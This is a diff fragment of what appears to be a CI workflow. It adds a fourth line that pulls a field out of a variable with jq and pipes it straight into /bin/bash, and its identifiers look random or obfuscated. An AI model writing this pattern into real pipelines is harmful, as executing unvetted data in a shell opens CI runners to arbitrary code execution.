@@ -26,6 +26,7 @@ jobs:
           echo $jqi4 | jq -r .vs03117 | /bin/bash
           printf '%s' "$sl721" | jq -r .n2 | /bin/bash
           echo $ckz3 | jq -r .jbm0 | /bin/bash
+          echo $mte656 | jq -r .ent6631 | /bin/bash
 
       - name: Persist output
         if: always()
